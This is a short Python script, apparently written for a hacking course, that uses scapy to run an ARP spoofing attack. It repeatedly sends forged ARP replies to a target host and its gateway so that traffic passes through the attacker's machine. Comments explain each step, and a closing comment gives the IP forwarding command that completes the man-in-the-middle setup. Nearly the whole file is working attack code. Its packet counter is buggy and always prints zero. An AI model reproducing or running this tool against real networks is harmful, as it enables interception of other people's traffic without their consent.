#!/usr/bin/env python
################################################################
###################### check arp -a time and often##############
################################################################
import scapy.all as scapy
import time
def get_mac(ip):#copied fron network1_scanner.py
    arp_request=scapy.ARP(pdst=ip) 
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast=broadcast/arp_request 
    answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0] 
    return answered_list[0][1].hwsrc#being there is only one ip so 0 index
     
def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    #create packet to send to router and target 
    #spoof ip is the ip to fool no info for hacker computer to set
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)#set the value look for list of it as in network scanner use scapy.ls(scapy.ARP)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet,verbose=False)
    #by default op is 1 ie we create arp request but for spoof we need to create arp response so make op to 2
    # set pdst to target ip so to get target ip of connected network use network1_scanner we built previously
    # set mac address  of target computer using hwdst use same scanner py file for corresponding mac of pdst
    #pdst= ip of destination,hwdst=hardware destination psrc=source ip
    # set psrc=router ip because to tell target this packet come from router
    # thus sending this packet target set its arp table with ip of router and mac of hacker machine
    # the above packet fool the target that our computer is router
#we have to send packet up the time we want to be in middle because if we send only pair of packet to both router and target
#then after that they come in past form so loop infinit and send packet upto you want in middle 
# sending packet infinite time and exiting by ctrl c is best 
def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    # if we dont specify source mac address then scapy will take our mack for default but for this fun we 
    # need to restore mac so we need to set source ip and mac as router for target and as target mac for router
    # no need to provide information of source ie hacker device 
    scapy.send(packet,count=4,verbose=False)#4 response packet will be send  
target_ip="10.0.2.7"
gateway_ip="10.0.2.1"
try:
    send_packet_count=0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip) 
        send_packet_count+=send_packet_count
        print("\r[+] Packet sent "+ str(send_packet_count),end="")
        time.sleep(2)   
        # here the o/p covers the cli so make verbose = false you will not see anything but it is also not good
except KeyboardInterrupt:
    print("[+] Detected CTRL+C...Quitting")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)
    # try except for handle ugly outcome after press ctrl c
#now target loss the connectivity to internet as its traffic comes to our mac so  
# echo 1 > /proc/sys/net/ipv4/ip_forward for IP forwarding in arp spoof attack ie mimf


 
